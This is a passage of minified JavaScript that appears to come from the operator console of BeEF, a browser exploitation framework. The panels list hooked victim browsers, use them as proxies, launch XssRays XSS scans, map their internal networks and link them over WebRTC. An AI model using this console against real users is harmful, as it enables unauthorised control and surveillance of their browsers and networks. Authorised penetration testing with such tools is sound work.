"+o+"] ..."),n(t.getStore().getAt(i).data,e,r)):r.update_fail("Cancelled"):r.update_fail("Response for this request has not been received yet.")}}]}),t.rowCtxMenu.showAt(a.getXY())}}}),u=new Ext.Panel({id:"requester-history-panel-zombie-"+e.session,title:"History",items:[c],layout:"fit",listeners:{activate:function(e){e.items.items[0].store.reload({params:{nonce:Ext.get("nonce").dom.value}})}}});ZombieTab_Requester.superclass.constructor.call(this,{id:"zombie-requester-tab-zombie-"+e.session,title:"Proxy",activeTab:0,viewConfig:{forceFit:!0,type:"fit"},items:[u,i,a],bbar:r,listeners:{afterrender:function(){t(e,r)}}})},Ext.extend(ZombieTab_Requester,Ext.TabPanel,{}),ZombieTab_XssRaysTab=function(e){function t(e,t){var n=new Ext.FormPanel({title:"Scan settings",id:"xssrays-config-form-zombie"+e.session,url:"/api/xssrays/scan/"+e.session+"?token="+r,labelWidth:230,border:!1,padding:"3px 5px 0 5px",defaults:{width:100},defaultType:"textfield",items:[{fieldLabel:"Clean Timeout (milliseconds before the injected iFrames are removed from the DOM)",name:"clean_timeout",allowBlank:!1,value:5e3,padding:"10px 5px 0 5px"},{xtype:"checkbox",id:"cross_origin",fieldLabel:"Cross-origin (check for XSS on cross-origin resources)",name:"cross_origin",checked:!0}],buttons:[{text:"Start Scan",handler:function(){var n=Ext.getCmp("xssrays-config-form-zombie"+e.session).getForm();t.update_sending("Starting XssRays on "+e.ip+" ..."),n.submit({params:{cross_origin:document.getElementById("cross_origin").checked},success:function(){t.update_sent("Scan settings saved for hooked browser ["+e.ip+"]. XssRays will be added to victim DOM on next polling.")},failure:function(){t.update_fail("Error! Something went wrong saving scan settings.")}})}}]});panel=Ext.getCmp("xssrays-config-zombie-"+e.session),panel.setTitle("Scan Config"),panel.add(n)}var n=new Beef_StatusBar("xssrays-bbar-zombie-"+e.session),o=30,r=BeefWUI.get_rest_token(),i=new Ext.Panel({id:"xssrays-config-zombie-"+e.session,title:"Scan Config",layout:"fit"}),a=new Ext.ux.data.PagingJsonStore({storeId:"xssrays-logs-store-zombie-"+e.session,remoteSort:!1,autoDestroy:!0,autoLoad:!1,proxy:new Ext.data.HttpProxy({method:"GET",url:"/api/xssrays/rays/"+e.session+"?token="+r}),root:"rays",fields:["id","vector_method","vector_name","vector_poc"],sortInfo:{field:"id",direction:"DESC"}}),s=new Ext.PagingToolbar({pageSize:o,store:a,displayInfo:!0,displayMsg:"Displaying history {0} - {1} of {2}",emptyMsg:"No history to display"}),l=new Ext.grid.GridPanel({id:"xssrays-logs-grid-zombie-"+e.session,store:a,bbar:s,border:!1,loadMask:{msg:"Loading History..."},viewConfig:{forceFit:!0},view:new Ext.grid.GridView({forceFit:!0,emptyText:"No History",enableRowBody:!0}),columns:[{header:"Id",width:10,sortable:!0,dataIndex:"id",hidden:!0},{header:"Vector Method",width:30,sortable:!0,dataIndex:"vector_method",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Vector Name",width:40,sortable:!0,dataIndex:"vector_name",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Vector PoC",sortable:!0,dataIndex:"vector_poc",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}}],listeners:{afterrender:function(e){e.store.reload({params:{start:0,limit:o,sort:"date",dir:"DESC"}})}}}),d=new Ext.Panel({id:"xssrays-logs-panel-zombie-"+e.session,title:"Logs",items:[l],layout:"fit",listeners:{activate:function(e){e.items.items[0].store.reload()}}});ZombieTab_XssRaysTab.superclass.constructor.call(this,{id:"xssrays-log-tab-"+e.session,title:"XssRays",activeTab:0,viewConfig:{forceFit:!0,type:"fit"},items:[d,i],bbar:n,listeners:{afterrender:function(){t(e,n)}}})},Ext.extend(ZombieTab_XssRaysTab,Ext.TabPanel,{}),PanelViewer={},Ext.onReady(function(){Ext.QuickTips.init(),zombiesTreeLists={basic:new zombiesTreeList("basic"),requester:new zombiesTreeList("requester")},zombieTabs=new ZombieTabs(zombiesTreeLists),zombiesManager=new ZombiesMgr(zombiesTreeLists),mainPanel=new MainPanel;new Ext.Viewport({layout:"border",items:[new Ext.BoxComponent({region:"north",el:"header",height:32}),zombieTabs,mainPanel]});setTimeout("locationHashChanged()",1e3),new DoLogout});var lastpoll=(new Date).getTime();Ext.TaskMgr.start({run:function(){Ext.Ajax.request({url:"/api/hooks/?token="+beefwui.get_rest_token(),method:"GET",success:function(e){var t;try{t=Ext.util.JSON.decode(e.responseText)}catch(o){document.getElementById("header-right").innerHTML="You appear to be logged out. <a href='/ui/panel/'>Login</a>"}var n=t["hooked-browsers"]?t["hooked-browsers"]:null;zombiesManager&&n&&zombiesManager.updateZombies(n),lastpoll=(new Date).getTime(),document.getElementById("header-right").innerHTML=""},failure:function(){(new Date).getTime()-lastpoll>6e4&&(document.getElementById("header-right").innerHTML="Framework is down")}})},interval:1e4}),window.onhashchange=locationHashChanged,LogsDataGrid=function(e,t,n){this.page=t,this.url=e,this.base=void 0!==n?n:{};var o=BeefWUI.get_rest_token();this.store=new Ext.ux.data.PagingJsonStore({root:"logs",autoDestroy:!0,autoLoad:!1,proxy:new Ext.data.HttpProxy({method:"GET",url:e+"?token="+o}),storeId:"myStore",baseParams:this.base,idProperty:"id",fields:["id","type","event","date","hooked_browser_id"],totalProperty:"count",remoteSort:!1,sortInfo:{field:"id",direction:"DESC"}}),this.bbar=new Ext.PagingToolbar({pageSize:this.page,store:this.store,displayInfo:!0,displayMsg:"Displaying logs {0} - {1} of {2}",emptyMsg:"No logs to display"}),this.columns=[{id:"log-id",header:"Id",hidden:!1,dataIndex:"id",sortable:!0,width:20},{id:"log-type",header:"Type",dataIndex:"type",sortable:!0,width:60,renderer:function(e){return"<b>"+$jEncoder.encoder.encodeForHTML(e)+"</b>"}},{id:"log-event",header:"Event",dataIndex:"event",sortable:!0,width:420,renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{id:"log-date",header:"Date",dataIndex:"date",width:80,renderer:$jEncoder.encoder.encodeForHTML(this.formatDate),sortable:!0},{id:"log-browser",header:"Browser ID",dataIndex:"hooked_browser_id",sortable:!0,width:35}],LogsDataGrid.superclass.constructor.call(this,{region:"center",id:"topic-grid",loadMask:{msg:"Loading Feed..."},sm:new Ext.grid.RowSelectionModel({singleSelect:!0}),viewConfig:{forceFit:!0},listeners:{afterrender:function(e){e.store.reload({params:{start:0,limit:e.page,sort:"id",dir:"DESC"}})}}})},Ext.extend(LogsDataGrid,Ext.grid.GridPanel,{}),Ext.override(Ext.PagingToolbar,{doRefresh:function(){delete this.store.lastParams,this.doLoad(this.cursor)}}),BrowserDetailsDataGrid=function(e,t,n){this.page=t,this.url=e,this.base=void 0!==n?n:{};var o=BeefWUI.get_rest_token();this.store=new Ext.ux.data.PagingJsonStore({root:"details",autoDestroy:!0,autoLoad:!0,proxy:new Ext.data.HttpProxy({method:"GET",url:e+"?token="+o}),storeId:"details-store",baseParams:this.base,idProperty:"id",fields:["key","value","source"],totalProperty:"count",remoteSort:!1,sortInfo:{field:"key",direction:"ASC"}}),this.bbar=new Ext.PagingToolbar({pageSize:this.page,store:this.store,displayInfo:!0,displayMsg:"Displaying zombie browser details {0} - {1} of {2}",emptyMsg:"No zombie browser data to display"}),this.columns=[{id:"details-key",header:"Key",dataIndex:"key",sortable:!0,width:40,renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{id:"details-value",header:"Value",dataIndex:"value",sortable:!0,width:60,renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}}],BrowserDetailsDataGrid.superclass.constructor.call(this,{region:"center",id:"topic-grid",loadMask:{msg:"Loading Feed..."},sm:new Ext.grid.RowSelectionModel({singleSelect:!0}),viewConfig:{forceFit:!0},listeners:{afterrender:function(e){e.store.reload({params:{start:0,limit:e.page,sort:"key",dir:"ASC"}})},rowclick:function(e,t){e.getStore().getAt(t).data},containercontextmenu:function(e,t){t.preventDefault()}}})},Ext.extend(BrowserDetailsDataGrid,Ext.grid.GridPanel,{}),Ext.override(Ext.PagingToolbar,{doRefresh:function(){delete this.store.lastParams,this.doLoad(this.cursor)}}),ZombieDataGrid=function(e,t,n){this.page=t,this.url=e,this.base=void 0!==n?n:{};var o=BeefWUI.get_rest_token();this.store=new Ext.ux.data.PagingJsonStore({root:"zombies",autoDestroy:!0,autoLoad:!0,proxy:new Ext.data.HttpProxy({method:"GET",url:e+"?token="+o}),storeId:"zombies-store",baseParams:this.base,idProperty:"id",fields:["id","session","ip","domain","port","name","version","os","os_version","firstseen","lastseen"],totalProperty:"count",remoteSort:!1,sortInfo:{field:"id",direction:"ASC"}}),this.bbar=new Ext.PagingToolbar({pageSize:this.page,store:this.store,displayInfo:!0,displayMsg:"Displaying zombies {0} - {1} of {2}",emptyMsg:"No zombies to display"}),this.columns=[{id:"zombie-id",header:"ID",hidden:!1,dataIndex:"id",sortable:!0,width:10},{id:"zombie-session",header:"Session",dataIndex:"session",sortable:!0,hidden:!0,width:20,renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{id:"zombie-ip",header:"IP",dataIndex:"ip",sortable:!0,width:20,renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{id:"zombie-domain",header:"Domain",dataIndex:"domain",sortable:!0,width:20,renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{id:"zombie-port",header:"Port",dataIndex:"port",sortable:!0,width:20,renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{id:"zombie-browser_name",header:"Browser",dataIndex:"name",sortable:!0,width:20,renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{id:"zombie-browser_version",header:"Browser Version",dataIndex:"version",sortable:!0,width:20,renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{id:"zombie-os",header:"OS",dataIndex:"os",sortable:!0,width:20,renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{id:"zombie-os_version",header:"OS Version",dataIndex:"os_version",sortable:!0,width:20,renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{id:"zombie-first_seen",header:"First Seen",dataIndex:"firstseen",sortable:!0,width:25,renderer:function(e){return $jEncoder.encoder.encodeForHTML(new Date(1e3*e).toUTCString())}},{id:"zombie-last_seen",header:"Last Seen",dataIndex:"lastseen",sortable:!0,width:25,renderer:function(e){return $jEncoder.encoder.encodeForHTML(new Date(1e3*e).toUTCString())}}],ZombieDataGrid.superclass.constructor.call(this,{region:"center",id:"topic-grid",loadMask:{msg:"Loading Feed..."},sm:new Ext.grid.RowSelectionModel({singleSelect:!0}),viewConfig:{forceFit:!0},listeners:{afterrender:function(e){e.store.reload({params:{start:0,limit:e.page,sort:"id",dir:"ASC"}})},rowclick:function(e,t){e.getStore().getAt(t).data},containercontextmenu:function(e,t){t.preventDefault()},rowcontextmenu:function(e,t,n){n.preventDefault(),e.getSelectionModel().selectRow(t),e.rowCtxMenu&&e.rowCtxMenu.destroy(),e.rowCtxMenu=new Ext.menu.Menu({items:[{id:"zombie_grid_use_as_proxy",text:"Use as Proxy",iconCls:"zombie-tree-ctxMenu-proxy"},{xtype:"menuseparator"},{id:"zombie_grid_xssrays_hooked_origin",text:"Launch XssRays on Hooked Domain",iconCls:"zombie-tree-ctxMenu-xssrays"},{xtype:"menuseparator"},{id:"zombie_grid_delete_zombie",text:"Delete Zombie",iconCls:"zombie-tree-ctxMenu-delete"}],listeners:{itemclick:function(t){var n=e.selModel.getSelected().get("session");switch(t.id){case"zombie_grid_use_as_proxy":Ext.Ajax.request({url:"/api/proxy/setTargetZombie?token="+beefwui.get_rest_token(),method:"POST",headers:{"Content-Type":"application/json; charset=UTF-8"},jsonData:{hb_id:escape(n)}});break;case"zombie_grid_xssrays_hooked_origin":Ext.Ajax.request({url:"/api/xssrays/scan/"+escape(n)+"?token="+beefwui.get_rest_token(),method:"POST"});break;case"zombie_grid_rtc_caller":beefwui.rtc_caller=n;break;case"zombie_grid_rtc_receiver":beefwui.rtc_receiver=n;var o="/api/webrtc/go?token="+beefwui.get_rest_token();Ext.Ajax.request({url:o,method:"POST",headers:{"Content-Type":"application/json; charset=UTF-8"},jsonData:{from:beefwui.get_hb_id(beefwui.rtc_caller),to:beefwui.get_hb_id(beefwui.rtc_receiver),verbose:!0}});break;case"zombie_grid_delete_zombie":var r=beefwui.get_rest_token();if(!confirm("Are you sure you want to delete zombie [id: "+n+"] ?\nWarning: this will remove all zombie related data, including logs and command results!"))return;o="/api/hooks/"+escape(n)+"/delete?token="+r;Ext.Ajax.request({url:o,method:"GET"})}}}}),e.rowCtxMenu.showAt(n.getXY())}}})},Ext.extend(ZombieDataGrid,Ext.grid.GridPanel,{}),Ext.override(Ext.PagingToolbar,{doRefresh:function(){delete this.store.lastParams,this.doLoad(this.cursor)}}),MainPanel=function(){this.preview=new Ext.Panel({id:"preview",region:"south",cls:"preview",autoScroll:!0,listeners:PanelViewer.LinkInterceptor,tbar:[{id:"tab",text:"View in New Tab",iconCls:"new-tab",disabled:!0,handler:this.openTab,scope:this}],clear:function(){this.body.update("");var e=this.topToolbar.items;e.get("tab").disable(),e.get("win").disable()}}),this.logs_grid=new LogsDataGrid("/api/logs",30),this.logs_grid.border=!1,this.zombies_grid=new ZombieDataGrid("/api/hooks/all",30),this.zombies_grid.border=!1,this.welcome_tab=new WelcomeTab,this.auto_run_tab=new AutoRunTab,MainPanel.superclass.constructor.call(this,{id:"main-tabs",activeTab:0,region:"center",margins:"0 5 5 0",resizeTabs:!0,tabWidth:150,minTabWidth:120,enableTabScroll:!0,plugins:new Ext.ux.TabCloseMenu,items:[{id:"welcome-view",title:"Getting Started",layout:"border",hideMode:"offsets",closable:!0,plain:!0,shadow:!0,items:[this.welcome_tab]},{id:"logs-view",layout:"border",title:"Logs",hideMode:"offsets",items:[this.logs_grid]},{id:"zombies-view",layout:"border",title:"Zombies",hideMode:"offsets",items:[this.zombies_grid]},{id:"autorun-view",title:"Auto Run",layout:"border",hideMode:"offsets",items:[this.auto_run_tab]}]})},Ext.extend(MainPanel,Ext.TabPanel),Ext.reg("appmainpanel",MainPanel),ZombieTab=function(e){main_tab=new ZombieTab_DetailsTab(e),log_tab=new ZombieTab_LogTab(e),commands_tab=new ZombieTab_Commands(e),proxy_tab=new ZombieTab_Requester(e),xssrays_tab=new ZombieTab_XssRaysTab(e),network_tab=new ZombieTab_Network(e),webrtc_tab=new ZombieTab_Rtc(e),ZombieTab.superclass.constructor.call(this,{id:"current-browser",activeTab:0,loadMask:{msg:"Loading browser..."},title:"Current Browser",autoScroll:!0,closable:!1,viewConfig:{forceFit:!0,type:"fit"},items:[main_tab,log_tab,commands_tab,proxy_tab,xssrays_tab,network_tab,webrtc_tab],listeners:{afterrender:function(e){e.hideTabStripItem(webrtc_tab)}}})},Ext.extend(ZombieTab,Ext.TabPanel,{listeners:{activate:function(){},deactivate:function(){},close:function(){}}}),ZombieTabs=function(e){for(tree_name in this.tree_items=new Array,e){var t=e[tree_name];"basic"!=tree_name&&(t.tree_configuration.distributed=!0),this.tree_items.push(t)}MainPanel.superclass.constructor.call(this,{id:"zombie-tree-tabs-panel",title:"Hooked Browsers",headerAsText:!0,tabPosition:"bottom",region:"west",activeTab:0,margins:"0 5 5 5",width:225,minSize:175,maxSize:400,deferredRender:!1,items:this.tree_items})},Ext.extend(ZombieTabs,Ext.TabPanel),zombiesTreeList=function(e){var t=e.slice(0,1).toUpperCase()+e.slice(1);zombiesTreeList.superclass.constructor.call(this,{id:"zombie-tree-"+e,region:"west",title:t,split:!0,rootVisible:!1,lines:!1,autoScroll:!0,useArrows:!0,root:new Ext.tree.TreeNode("My Zombies"),collapseFirst:!1}),this.online_hooked_browsers_treenode=this.root.appendChild(new Ext.tree.TreeNode({qtip:"Online hooked browsers",text:"Online Browsers",cls:"online-zombies-node",expanded:!0})),this.offline_hooked_browsers_treenode=this.root.appendChild(new Ext.tree.TreeNode({qtip:"Offline hooked browsers",text:"Offline Browsers",cls:"offline-zombies-node",expanded:!1}))},Ext.extend(zombiesTreeList,Ext.tree.TreePanel,{tree_configuration:{"sub-branch":"domain"},online_hooked_browsers_array:new Array,offline_hooked_browsers_array:new Array,contextMenu:new Ext.menu.Menu({items:[{id:"use_as_proxy",text:"Use as Proxy",iconCls:"zombie-tree-ctxMenu-proxy"},{xtype:"menuseparator"},{id:"xssrays_hooked_origin",text:"Launch XssRays on Hooked Domain",iconCls:"zombie-tree-ctxMenu-xssrays"},{xtype:"menuseparator"},{id:"delete_zombie",text:"Delete Zombie",iconCls:"zombie-tree-ctxMenu-delete"}],listeners:{itemclick:function(e){var t=this.contextNode.id.split("-")[2];switch(e.id){case"use_as_proxy":Ext.Ajax.request({url:"/api/proxy/setTargetZombie?token="+beefwui.get_rest_token(),method:"POST",headers:{"Content-Type":"application/json; charset=UTF-8"},jsonData:{hb_id:escape(t)}});break;case"xssrays_hooked_origin":Ext.Ajax.request({url:"/api/xssrays/scan/"+escape(t)+"?token="+beefwui.get_rest_token(),method:"POST"});break;case"rtc_caller":beefwui.rtc_caller=t;break;case"rtc_receiver":beefwui.rtc_receiver=t;var n="/api/webrtc/go?token="+beefwui.get_rest_token();Ext.Ajax.request({url:n,method:"POST",headers:{"Content-Type":"application/json; charset=UTF-8"},jsonData:{from:beefwui.get_hb_id(beefwui.rtc_caller),to:beefwui.get_hb_id(beefwui.rtc_receiver),verbose:!0}});break;case"delete_zombie":var o=beefwui.get_rest_token();if(!confirm("Are you sure you want to delete zombie [id: "+t+"] ?\nWarning: this will remove all zombie related data, including logs and command results!"))return;n="/api/hooks/"+escape(t)+"/delete?token="+o;Ext.Ajax.request({url:n,method:"GET"})}}}}),listeners:{click:function(e){globalnode=e,e.leaf&&(window.location.hash="#id="+e.attributes.session)},contextmenu:function(e,t){if(e.leaf){e.select();var n=e.getOwnerTree().contextMenu;try{n.contextNode=e,"undefined"==typeof beefwui.rtc_caller?n.items.get("rtc_receiver").disable():beefwui.rtc_caller===e.id.substr(-80)?n.items.get("rtc_receiver").disable():n.items.get("rtc_receiver").enable()}catch(o){}n.showAt(t.getXY())}},checkchange:function(){}},updateConfiguration:function(e){Ext.apply(this.tree_configuration,e)},reload:function(){try{this.online_hooked_browsers_treenode.removeAll(!0)}catch(e){}Ext.each(this.online_hooked_browsers_array,function(e){this.addZombie(e,e.online,e.checkbox)},this),this.online_hooked_browsers_treenode.childNodes.length>0&&this.online_hooked_browsers_treenode.expand(!0);try{this.offline_hooked_browsers_treenode.removeAll(!0)}catch(e){}Ext.each(this.offline_hooked_browsers_array,function(e){this.addZombie(e,e.online,e.checkbox)},this),this.offline_hooked_browsers_treenode.childNodes.length>0&&this.offline_hooked_browsers_treenode.expand(!0)},addZombie:function(e,t,n){var o,r,i;if(t?(o="zombie-online-"+e.session,r=this.online_hooked_browsers_treenode):(o="zombie-offline-"+e.session,r=this.offline_hooked_browsers_treenode),!this.getNodeById(o)){var a="unknown.png";switch(e.browser_name){case"FF":a="firefox.png";break;case"IE":a="msie.png";break;case"E":a="edge.png";break;case"EP":a="epiphany.png";break;case"S":a="safari.png";break;case"C":a="chrome.png";break;case"O":a="opera.ico";break;case"MI":a="midori.png";break;case"OD":a="odyssey.png";break;case"BR":a="brave.png";break;default:a="unknown.png"}var s="unknown.png";switch(e.os_name){case"Android":s="android.png";break;case"Windows":s="win.png";break;case"Linux":s="linux.png";break;case"Mac":s="mac.png";break;case"QNX":s="qnx.ico";break;case"SunOS":s="sunos.gif";break;case"BeOS":s="beos.png";break;case"OpenBSD":s="openbsd.ico";break;case"iOS":s="ios.png";break;case"iPhone":s="iphone.jpg";break;case"iPad":s="ipad.png";break;case"iPod":s="ipod.jpg";break;case"webOS":s="webos.png";break;case"AROS":s="icaros.png";break;case"Maemo":s="maemo.ico";break;case"BlackBerry":s="blackberry.png";break;default:s="unknown.png"}var l="unknown.png";switch(e.hw_name){case"Virtual Machine":l="vm.png";break;case"Laptop":l="laptop.png";break;case"Android":case"Android Phone":case"Android Tablet":l="android.png";break;case"iPhone":l="iphone.jpg";break;case"iPod Touch":l="ipod.jpg";break;case"iPad":l="ipad.png";break;case"BlackBerry":case"BlackBerry Tablet":case"BlackBerry Touch":case"BlackBerry OS 5":case"BlackBerry OS 6":l="blackberry.png";break;case"Nokia":case"Nokia S60 Open Source":case"Nokia S60":case"Nokia S70":case"Nokia S80":case"Nokia S90":case"Nokia Symbian":l="nokia.ico";break;case"Maemo Tablet":l="maemo.ico";break;case"HTC":l="htc.ico";break;case"Motorola":l="motorola.png";break;case"Zune":l="zune.gif";break;case"Kindle":case"Kindle Fire":l="kindle.png";break;case"Nexus":case"Google Nexus One":l="nexus.png";break;case"Ericsson":l="sony_ericsson.png";break;case"Windows Phone":case"Windows Phone 7":case"Windows Phone 8":case"Windows Phone 10":case"Windows Mobile":l="win.png";break;default:l="pc.png"}var d="";d+=e.ip,d+="<hr/>",d+="<img width='13px' height='13px' class='zombie-tree-icon' src='/ui/media/images/favicon.png' /> ",d+="Origin: "+e.domain+":"+e.port,d+="<br/>",d+="<img width='13px' height='13px' class='zombie-tree-icon' src='/ui/media/images/icons/"+escape(a)+"' /> ",d+="Browser: "+e.browser_name+" "+e.browser_version,d+="<br/>",d+=" <img width='13px' height='13px' class='zombie-tree-icon' src='/ui/media/images/icons/"+escape(s)+"' /> ","Unknown"==e.os_version?d+="OS: "+e.os_name:d+="OS: "+e.os_name+" "+e.os_version,d+="<br/>",d+=" <img width='13px' height='13px' class='zombie-tree-icon' src='/ui/media/images/icons/"+escape(l)+"' /> ",d+="Hardware: "+e.hw_name,d+="<br/>",e.country&&e.country_code&&"Unknown"!=e.country?(d+=" <img width='13px' height='13px' class='zombie-tree-icon' src='/ui/media/images/icons/country-squared/"+escape(e.country_code.toLowerCase())+".svg' /> ",d+="Location: "+e.city+", "+e.country):(d+=" <img width='13px' height='13px' class='zombie-tree-icon' src='/ui/media/images/icons/unknown.png' /> ",d+="Location: Unknown"),d+="<hr/>",d+="Local Date: "+e.date,e.qtip=d;var c="";if(c+="<img width='13px' height='13px' class='zombie-tree-icon' src='/ui/media/images/icons/"+escape(a)+"' /> ",c+="<img width='13px' height='13px' class='zombie-tree-icon' src='/ui/media/images/icons/"+escape(s)+"' /> ",c+="<img width='13px' height='13px' class='zombie-tree-icon' src='/ui/media/images/icons/"+escape(l)+"' /> ",e.country&&e.country_code&&"Unknown"!=e.country?c+="<img width='13px' height='13px' class='zombie-tree-icon' src='/ui/media/images/icons/country-squared/"+escape(e.country_code.toLowerCase())+".svg' /> ":c+="<img width='13px' height='13px' class='zombie-tree-icon' src='/ui/media/images/icons/unknown.png' /> ",c+=e.ip,e.text=c,t&&-1==Ext.pluck(this.online_hooked_browsers_array,"session").indexOf(e.session))this.online_hooked_browsers_array.push(e);return t||-1!=this.offline_hooked_browsers_array.indexOf(e)||this.offline_hooked_browsers_array.push(e),Ext.apply(e,{iconCls:"feed-icon",leaf:!0,id:o,checked:!n&&null,online:t,checkbox:n}),i=new Ext.tree.TreeNode(e),r=this.addSubFolder(r,e[this.tree_configuration["sub-branch"]],n),t?(Ext.apply(e,{cls:"zombie-online"}),r.appendChild(i)):(Ext.apply(e,{cls:"zombie-offline"}),r.appendChild(i)),i}},addSubFolder:function(e,t,n){if(!t)return e;if(e.hasChildNodes()){for(i in e.childNodes)if(node=e.childNodes[i],"object"==typeof node&&node.attributes.text==t)return node}else sub_folder_node=new Ext.tree.TreeNode({id:"sub-folder-"+t,text:t,qtip:"Browsers hooked on "+t,checked:!n&&null,type:this.tree_configuration["sub-branch"]}),e.appendChild(sub_folder_node),e=sub_folder_node;return e},compareAndRemove:function(zombies){var arr=["online","offline"],has_changed=!1;Ext.each(arr,function(branch_type){var new_set_zombies=zombies[branch_type],new_set_zombies_array=new Array;Ext.iterate(new_set_zombies,function(e,t){new_set_zombies_array.push(t)});var new_set_zombies_sessions=Ext.pluck(new_set_zombies_array,"session");if(new_set_zombies_sessions){var branch_node=eval("this."+branch_type+"_hooked_browsers_treenode"),hooked_browser_array=eval("this."+branch_type+"_hooked_browsers_array");0!=hooked_browser_array.length&&Ext.iterate(hooked_browser_array,function(known_hooked_browser,key){if(known_hooked_browser){var hb_session=known_hooked_browser.session;if(-1==new_set_zombies_sessions.indexOf(hb_session)){var node=this.getNodeById("zombie-"+branch_type+"-"+hb_session);if(node){branch_node.removeChild(node);var parentNode=node.parentNode;parentNode.childNodes.length<=1&&branch_node.removeChild(parentNode),node.setId("hooked-browser-node-destroyed"),hooked_browser_array=hooked_browser_array.slice(key,key+1),eval("this."+branch_type+"_hooked_browsers_array = hooked_browser_array")}}-1!=new_set_zombies_sessions.indexOf(hb_session)&&Ext.iterate(new_set_zombies,function(e,t){t.session==known_hooked_browser.session&&t.ip!=known_hooked_browser.ip&&(known_hooked_browser.ip=t.ip,known_hooked_browser.domain=t.ip,known_hooked_browser.port=t.port,known_hooked_browser.text=known_hooked_browser.text.replace(/\d*\.\d*\.\d*\.\d*/gi,t.ip),has_changed=!0)})}},this)}},this),has_changed&&this.reload()}});var ZombiesMgr=function(e){this.zombies_tree_lists=e,this.zombieFactory=function(e,t){var n=t[e].ip,o=t[e].session,r=t[e].name,i=t[e].version,a=t[e].os,s=t[e].os_version,l=t[e].hardware;return{id:e,ip:n,session:o,check:!1,domain:t[e].domain,port:t[e].port,browser_name:r,browser_version:i,os_name:a,os_version:s,hw_name:l,city:t[e].city,country:t[e].country,country_code:t[e].country_code,date:t[e].date_stamp}},this.updateZombies=function(e){var t=e.offline,n=e.online,o=new Array;for(tree_type in this.zombies_tree_lists){for(var r in hooked_browsers_tree=this.zombies_tree_lists[tree_type],hooked_browsers_tree.compareAndRemove(e),t){var i=this.zombieFactory(r,t);hooked_browsers_tree.addZombie(i,!1,"basic"!=tree_type),o.push(i)}for(var r in n){var a=this.zombieFactory(r,n);hooked_browsers_tree.addZombie(a,!0,"basic"!=tree_type),o.push(a)}hooked_browsers_tree.online_hooked_browsers_treenode.childNodes.length>0&&hooked_browsers_tree.online_hooked_browsers_treenode.expand(!0),hooked_browsers_tree.offline_hooked_browsers_treenode.childNodes.length>0&&hooked_browsers_tree.offline_hooked_browsers_treenode.expand(!0)}beefwui.hooked_browsers=o}};ZombieTab_Network=function(e){var t=new Beef_StatusBar("network-bbar-zombie-"+e.session),n=beefwui.get_rest_token(),o=function(e){var o="";return jQuery.ajax({type:"GET",url:"/api/modules/search/"+e+"?token="+n,async:!1,processData:!1,success:function(e){o=e.id},error:function(){t.update_fail("Error getting module id for '"+e+"'")}}),o},r=function(e){return e.reduce(function(e,t){return e.indexOf(t)<0&&e.push(t),e},[])},i=function(){var o=null,i="/api/network/hosts/"+e.session+"?token="+n;jQuery.ajax({contentType:"application/json",dataType:"json",type:"GET",url:i,async:!1,processData:!1,loadMask:{msg:"Loading network hosts..."},success:function(e){o=e},error:function(){t.update_fail("Error retrieving network hosts")}});var a="/ui/media/images/icons/",s=50,l=[],d=[];if("0"==o.count)return t.update_fail("Found no network hosts"),!1;l.push({id:1e3,label:"",image:a+"../beef.png",shape:"image"});var c=1001;l.push({id:c,label:"Hooked Browser",image:a+"Apps-internet-web-browser-icon.png",shape:"image"}),d.push({from:1e3,to:c,length:s});var u=[];for(var p in o.hosts)if(!isNaN(o.hosts[p].id)){var f=(m=o.hosts[p].ip).split(".")[0];u.push(f)}u=r(u);for(var h=0;h<=u.length;h++)isNaN(u[h])||(l.push({id:u[h],label:u[h]+".0.0.0/8",image:a+"Network-Pipe-icon.png",shape:"image"}),d.push({from:c,to:u[h],length:s}));h=2e3;for(var p in o.hosts)if(!isNaN(o.hosts[p].id)){var m=o.hosts[p].ip,g=o.hosts[p].hostname,y=(o.hosts[p].type,o.hosts[p].os),b=m;g&&(b+=" ["+g+"]"),y&&(b+="\n"+y);var x="pc.png";l.push({id:h,label:b,image:a+x,shape:"image"}),d.push({from:m.split(".")[0],to:h,length:s}),h++}var v=document.getElementById("zombie_network"),w={nodes:l,edges:d},_={};new vis.Network(v,w,_)},a=new Ext.Panel({id:"network-map-panel-zombie-"+e.session,title:"Map",layout:"fit",autoDestroy:!0,html:'<div id="zombie_network"></div>',listeners:{activate:function(){i()}}}),s=new Ext.ux.data.PagingJsonStore({
storeId:"network-host-store-zombie-"+e.session,proxy:new Ext.data.HttpProxy({url:"/api/network/hosts/"+e.session+"?token="+n,method:"GET"}),remoteSort:!1,autoDestroy:!0,autoLoad:!1,root:"hosts",fields:["id","ip","hostname","type","os","mac","lastseen"],sortInfo:{field:"ip",direction:"ASC"}}),l=50,d=new Ext.PagingToolbar({pageSize:l,store:s,displayInfo:!0,displayMsg:"Displaying network hosts {0} - {1} of {2}",emptyMsg:"No hosts to display"}),c=new Ext.grid.GridPanel({id:"network-host-grid-zombie-"+e.session,store:s,bbar:d,border:!1,loadMask:{msg:"Loading network hosts..."},viewConfig:{forceFit:!0},view:new Ext.grid.GridView({forceFit:!0,emptyText:"No hosts",enableRowBody:!0}),columns:[{header:"Id",width:5,sortable:!0,dataIndex:"id",hidden:!0},{header:"IP Address",width:10,sortable:!0,dataIndex:"ip",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Host Name",width:10,sortable:!0,dataIndex:"hostname",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Type",width:15,sortable:!0,dataIndex:"type",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Operating System",width:10,sortable:!0,dataIndex:"os",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"MAC Address",width:10,sortable:!0,dataIndex:"mac",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Last Seen",width:15,sortable:!0,dataIndex:"lastseen",renderer:function(e){return $jEncoder.encoder.encodeForHTML(new 